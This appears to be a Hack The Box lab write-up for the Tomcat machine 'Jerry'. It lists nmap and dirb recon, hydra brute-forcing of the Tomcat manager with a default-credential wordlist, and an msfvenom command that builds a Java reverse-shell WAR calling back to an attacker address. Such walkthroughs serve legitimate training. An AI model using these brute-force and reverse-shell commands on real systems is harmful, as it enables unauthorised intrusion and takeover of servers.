# Jerry Hack The Box Tips

# ${{\color{purple}Initial Recon}}\ $

``nmap -sC -sV -oA jerry 10.10.10.95``

### or

``nmap -p- -sV -oA fulljerry 10.10.10.95``

### Directory Bruteforce 

``dirb http://10.10.10.95:8080/ -w /usr/share/wordlists/dirb/common.txt``

![image](https://user-images.githubusercontent.com/123066149/217837076-177eb05d-fd9b-44bb-8619-dd0c19e39911.png)

# ${{\color{purple}Initial Foothold}}\ $

### Find default admin panel with Basic http authentication **:white_check_mark:**

http://10.10.10.95:8080/manager/status
http://10.10.10.95:8080/manager/html

![image](https://user-images.githubusercontent.com/123066149/217837876-b8eeaf5c-e10c-48c0-9469-8574fbeba3fc.png)
![image](https://user-images.githubusercontent.com/123066149/217838004-2ed7f501-8a57-4d9f-9ada-a8640cea0ca2.png)

# ${{\color{purple}Exploitation}}\ $

### I used ``hydra`` for bruteforce http because it didn't work as I wanted with burp intruder :

### I used the wordlist tomcat-betterdefaultpasslist.txt from seclits :

``cd /usr/share/wordlists/seclists && find . | grep tomcat``

![image](https://user-images.githubusercontent.com/123066149/217838601-ff6a39d7-8ad5-4163-97a4-f60de4d4cd20.png)

``hydra -C tomcat-betterdefaultpasslist.txt http-get://10.10.10.95:8080/manager/html``

``hydra -C tomcat-betterdefaultpasslist.txt -s 8080 10.10.10.95 http-get /manager/html``

### Finally the last command is very good because it allows me to see the hydra requests in burp via the proxy and also to use hydra again 

``HYDRA_PROXY_HTTP=http://127.0.0.1:8080 hydra -C tomcat-betterdefaultpasslist.txt -s 8080 10.10.10.95 http-get /manager/html``


![image](https://user-images.githubusercontent.com/123066149/217839534-73005491-ecc0-48be-8d21-73f1a94d3504.png)

![image](https://user-images.githubusercontent.com/123066149/217839927-2d0231f4-2550-44fe-9331-72b68ee49741.png)


# ${{\color{purple}Privilege Escalation}}\ $

Tomcat service runs with the highest privileges

![image](https://user-images.githubusercontent.com/123066149/217841342-de04b991-cc8e-4071-a5a2-1ff0c75eba29.png)


![image](https://user-images.githubusercontent.com/123066149/217840387-43774f17-b81b-4ab1-9013-681a64162903.png)

``msfvenom -p java/shell_reverse_tcp LHOST=10.10.16.5 LPORT=445 -f war -o shell.war``

For this reverse shell in .war I used this site 

https://www.revshells.com

![image](https://user-images.githubusercontent.com/123066149/217842180-aadccf45-e960-42e2-881c-22bf24fe6c6e.png)

# ${{\color{purple}Points of Improvement}}\ $

* Better look at the error messages 

* Use seclists for http bruteforces

* Use multiple tools for http bruteforces
